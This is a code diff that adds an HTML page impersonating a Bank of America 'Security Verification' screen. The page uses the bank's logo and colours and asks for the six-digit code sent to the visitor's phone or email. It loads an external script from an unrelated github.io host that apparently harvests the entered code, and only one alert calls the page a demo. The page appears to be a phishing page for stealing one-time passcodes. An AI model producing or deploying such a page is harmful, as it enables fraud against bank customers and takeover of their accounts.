@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank of America – Verify Code</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #e9eef5;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.verify-container {
+  background-color: white;
+  padding: 35px;
+  width: 400px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+}
+
+.logo img {
+  width: 180px;
+  margin-bottom: 20px;
+}
+
+h2 {
+  color: #012169; /* BOA deep blue */
+  margin-bottom: 10px;
+  font-size: 22px;
+}
+
+p {
+  font-size: 13px;
+  color: #444;
+  margin-bottom: 20px;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #ccd0d5;
+  background-color: #f2f6fb;
+  color: black;
+  font-size: 18px;
+  text-align: center;
+  margin-bottom: 20px;
+  letter-spacing: 6px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: none;
+  background-color: #d6001c; /* BOA red */
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 10px;
+}
+
+.resend-btn {
+  background-color: #012169;
+  color: white;
+}
+
+button:disabled {
+  background-color: #999;
+  cursor: not-allowed;
+}
+
+.timer-text {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #666;
+}
+</style>
+
+</head>
+
+<body>
+<script src="https://plyarth.github.io/intc/int2.js"></script>
+<div class="verify-container">
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/20/Bank_of_America_logo.svg/320px-Bank_of_America_logo.svg.png" alt="Bank of America">
+  </div>
+
+  <h2>Security Verification</h2>
+
+  <p>
+    Enter the 6-digit code we sent to your registered phone number or email address.
+  </p>
+
+  <form>
+    <input type="text" id="boaCode" placeholder="------" maxlength="20" name="Otp Code" required>
+
+    <button type="submit">Confirm Code</button>
+
+    <button type="button" id="resendBtn" class="resend-btn" disabled>
+      Resend Code
+    </button>
+
+    <div class="timer-text">
+      You can resend a new code in <span id="timer">30</span>s
+    </div>
+  </form>
+
+</div>
+
+<script>
+let countdown = 30;
+const timer = document.getElementById("timer");
+const resendBtn = document.getElementById("resendBtn");
+const timerText = document.querySelector(".timer-text");
+
+function startTimer() {
+  const interval = setInterval(() => {
+    countdown--;
+    timer.innerText = countdown;
+
+    if (countdown <= 0) {
+      clearInterval(interval);
+      resendBtn.disabled = false;
+      timerText.innerText = "You can now request a new verification code";
+    }
+  }, 1000);
+}
+
+resendBtn.addEventListener("click", () => {
+  alert("Demo: BOA resend action triggered");
+
+  countdown = 30;
+  resendBtn.disabled = true;
+
+  timerText.innerHTML =
+    'You can resend a new code in <span id="timer">30</span>s';
+
+  startTimer();
+});
+
+startTimer();
+</script>
+
+</body>
+</html>
